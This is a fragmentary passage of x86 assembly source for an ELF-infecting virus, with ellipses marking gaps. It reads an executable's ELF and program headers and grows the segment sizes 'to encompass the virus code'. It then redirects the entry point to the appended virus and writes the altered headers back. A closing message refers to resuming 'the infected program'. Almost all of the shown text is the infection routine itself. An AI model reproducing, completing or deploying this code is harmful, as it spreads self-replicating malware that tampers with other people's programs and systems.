...
lseek ebx, 0, SEEK_SET ; seek to sart of file
lea ecx, BUF
read ebx, ecx, ELFHDR_SIZE
cmp eax, ELFHDR_SIZE
jl Err_Read

;copy files program header to stack
add ecx, PHDR_start ; get pointer to e_phoff in mapped elf header
mov ecx, dword[ecx] ; get e_phoff
lseek ebx, ecx, SEEK_SET ; seek to start of program headers in file
lea ecx, BUF
add ecx, ELFHDR_SIZE ; get pointer to the end of mapped elf header on stack
read ebx, ecx, PHDR_size ; read single program header to stack after elf header
cmp eax, PHDR_size
jl Err_Read

; get programs virtual address
mov eax, dword [ecx + PHDR_vaddr] ; get programs virtual address
mov VADDR, eax ; save programs virtual address on stack (at [ebp-16])

; modify mapped program headers file and mem sizes to encompass the virus code
mov eax, VIRUS_SIZE
add dword [ecx + PHDR_memsize], eax
add dword [ecx + PHDR_filesize], eax
...
add ecx, ENTRY ; get pointer to entry point in mapped elf header
...
mov eax, FILE_SIZE
add eax, VADDR ; get start of virus code at ELFexecs execution
mov dword [ecx], eax ; update entry opint in mapped elf header

; write modified elf header back to file
lseek ebx, 0, SEEK_SET ; seek to sart of file
lea ecx, BUF
write ebx, ecx, ELFHDR_SIZE
cmp eax, ELFHDR_SIZE
jl Err_Write

; write modified program header back to file
mov ecx, dword [ecx+PHDR_start]
lseek ebx, ecx, SEEK_SET ;seek to start of program headers in file
lea ecx, BUF
add ecx, ELFHDR_SIZE ; get pointer to mapped (and modified) program header
...
ErrOpen: 	db "Sorry cant open this file because I am probably running in it right now!", 10,"Wow Inception...",10,"So Ill just resume the infected program.",10,0
